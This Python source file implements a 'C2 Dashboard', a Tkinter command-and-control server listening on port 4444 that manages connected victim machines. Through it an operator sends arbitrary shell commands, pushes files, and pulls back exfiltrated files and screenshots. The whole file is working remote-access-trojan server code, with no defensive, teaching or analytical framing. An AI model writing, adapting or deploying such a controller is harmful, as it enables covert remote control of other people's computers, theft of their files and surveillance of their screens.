import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
from utils import reliable_send, reliable_recv
import base64
from PIL import Image, ImageTk
import io

HOST = "0.0.0.0"
PORT = 4444

clients = []
addresses = []


# -------------------- NETWORK --------------------

def accept_connections(server):
    while True:
        client_socket, addr = server.accept()
        clients.append(client_socket)
        addresses.append(addr)

        log(f"[+] Connection from {addr}")
        update_client_list()


# -------------------- FILE --------------------

def save_file(data):
    try:
        file_data = base64.b64decode(data)
        with open("received_file", "wb") as f:
            f.write(file_data)
        log("[+] File saved as received_file")
    except:
        log("[-] File save failed")


def send_file(client, path):
    try:
        with open(path, "rb") as f:
            reliable_send(client, base64.b64encode(f.read()).decode())
    except:
        log("[-] Failed to read file")


# -------------------- COMMAND --------------------

def send_command():
    try:
        selected_index = client_listbox.curselection()[0]
        client = clients[selected_index]
    except:
        log("[-] No client selected")
        return

    command = command_entry.get()
    if not command:
        return

    reliable_send(client, command)

    if command.startswith("upload "):
        send_file(client, command.split(" ", 1)[1])

    if command == "exit":
        client.close()
        clients.remove(client)
        update_client_list()
        return

    threading.Thread(target=receive_response, args=(client,), daemon=True).start()


def receive_response(client):
    try:
        response = reliable_recv(client)

        if response["type"] == "text":
            log(response["data"])

        elif response["type"] == "image":
            show_image(response["data"])

        elif response["type"] == "file":
            save_file(response["data"])

    except:
        log("[-] Connection lost")


# -------------------- UI --------------------

def update_client_list():
    client_listbox.delete(0, tk.END)
    for i, addr in enumerate(addresses):
        client_listbox.insert(tk.END, f"{i} - {addr}")


def log(message):
    output_box.insert(tk.END, message + "\n")
    output_box.yview(tk.END)


def show_image(image_data):
    img_bytes = base64.b64decode(image_data)
    image = Image.open(io.BytesIO(img_bytes))

    new_window = tk.Toplevel(app)
    new_window.title("Screenshot")

    img = ImageTk.PhotoImage(image)
    label = tk.Label(new_window, image=img)
    label.image = img
    label.pack()


# -------------------- GUI --------------------

app = tk.Tk()
app.title("C2 Dashboard")
app.geometry("900x500")
app.configure(bg="black")

client_listbox = tk.Listbox(app, bg="black", fg="green")
client_listbox.pack(side=tk.LEFT, fill=tk.Y)

output_box = scrolledtext.ScrolledText(app, bg="black", fg="green")
output_box.pack(fill=tk.BOTH, expand=True)

command_entry = tk.Entry(app, bg="black", fg="green")
command_entry.pack(fill=tk.X)

tk.Button(app, text="Send Command", command=send_command).pack()


# -------------------- START --------------------

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    log("[+] Listening...")

    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()


threading.Thread(target=start_server, daemon=True).start()

app.mainloop()
